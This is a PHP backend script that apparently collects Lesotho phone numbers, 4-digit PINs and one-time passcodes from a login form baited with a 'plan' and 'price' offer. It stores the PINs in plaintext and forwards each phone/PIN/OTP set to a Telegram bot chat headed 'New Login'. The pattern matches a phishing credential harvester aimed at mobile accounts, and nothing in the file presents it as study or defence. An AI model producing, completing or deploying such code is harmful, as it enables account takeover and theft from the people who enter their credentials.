<?php
require_once __DIR__ . '/connection.php';

header('Content-Type: application/json');

function sendTelegramMessage($botToken, $chatId, $message) {
    if (empty($botToken) || empty($chatId)) {
        return false;
    }

    if (!function_exists('curl_init')) {
        return false;
    }

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $payload = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);

    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $httpCode >= 200 && $httpCode < 300 && $result !== false;
}

$response = ['success' => false, 'message' => 'Invalid request.'];

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode($response);
    exit;
}

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (!is_array($data)) {
    echo json_encode($response);
    exit;
}

$phone = isset($data['phone']) ? trim((string) $data['phone']) : '';
$pin = isset($data['pin']) ? trim((string) $data['pin']) : '';
$otp = isset($data['otp']) ? trim((string) $data['otp']) : '';
$stage = isset($data['stage']) ? trim((string) $data['stage']) : 'login';
$plan = isset($data['plan']) ? trim((string) $data['plan']) : 'Unknown plan';
$price = isset($data['price']) ? trim((string) $data['price']) : '0';

if ($phone === '' || $pin === '') {
    $response['message'] = 'Phone number and PIN are required.';
    echo json_encode($response);
    exit;
}

if (!preg_match('/^\+266\d{8}$/', $phone)) {
    $response['message'] = 'Phone number must be in the format +266XXXXXXXX.';
    echo json_encode($response);
    exit;
}

if (!preg_match('/^\d{4}$/', $pin)) {
    $response['message'] = 'PIN must be exactly 4 digits.';
    echo json_encode($response);
    exit;
}

if ($stage === 'otp' && !preg_match('/^\d{4}$/', $otp)) {
    $response['message'] = 'OTP must be exactly 4 digits.';
    echo json_encode($response);
    exit;
}

$phoneNumberForDb = preg_replace('/^\+266/', '', $phone);

if (!preg_match('/^\d{8}$/', $phoneNumberForDb)) {
    $response['message'] = 'Phone number must contain 8 digits after +266.';
    echo json_encode($response);
    exit;
}

$idQuery = mysqli_query($conn, 'SELECT COALESCE(MAX(id), 0) + 1 AS next_id FROM users');
$nextIdResult = mysqli_fetch_assoc($idQuery);
$nextId = isset($nextIdResult['next_id']) ? (int) $nextIdResult['next_id'] : 1;

$stmt = mysqli_prepare($conn, 'INSERT INTO users (id, phone_number, pin) VALUES (?, ?, ?)');
if (!$stmt) {
    $response['message'] = 'Database insert failed: ' . mysqli_error($conn);
    echo json_encode($response);
    exit;
}

mysqli_stmt_bind_param($stmt, 'iss', $nextId, $phoneNumberForDb, $pin);
if (!mysqli_stmt_execute($stmt)) {
    $response['message'] = 'Database insert failed: ' . mysqli_error($conn);
    echo json_encode($response);
    exit;
}

mysqli_stmt_close($stmt);

$botToken = getenv('TELEGRAM_BOT_TOKEN') ?: (defined('TELEGRAM_BOT_TOKEN') ? TELEGRAM_BOT_TOKEN : '');
$chatId = getenv('TELEGRAM_CHAT_ID') ?: (defined('TELEGRAM_CHAT_ID') ? TELEGRAM_CHAT_ID : '');

$telegramPhone = $phoneNumberForDb;

$message = "<b>New Login</b>\n";
$message .= "Phone: {$telegramPhone}\n";
$message .= "PIN: {$pin}\n";
if ($stage === 'otp') {
    $message .= "OTP: {$otp}\n";
}
$message .= "Plan: {$plan}\n";
$message .= "Price: {$price}";

$telegramSent = sendTelegramMessage($botToken, $chatId, $message);

if (!$telegramSent) {
    $response = [
        'success' => false,
        'message' => 'Database saved, but Telegram is not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.'
    ];
    echo json_encode($response);
    exit;
}

$response = [
    'success' => true,
    'message' => $stage === 'otp'
        ? 'OTP submitted successfully and sent to Telegram.'
        : 'Login request accepted and saved to the database and Telegram.',
    'data' => [
        'phone' => $phone,
        'pin' => $pin,
        'otp' => $otp,
        'stage' => $stage,
        'plan' => $plan,
        'price' => $price
    ]
];

echo json_encode($response);
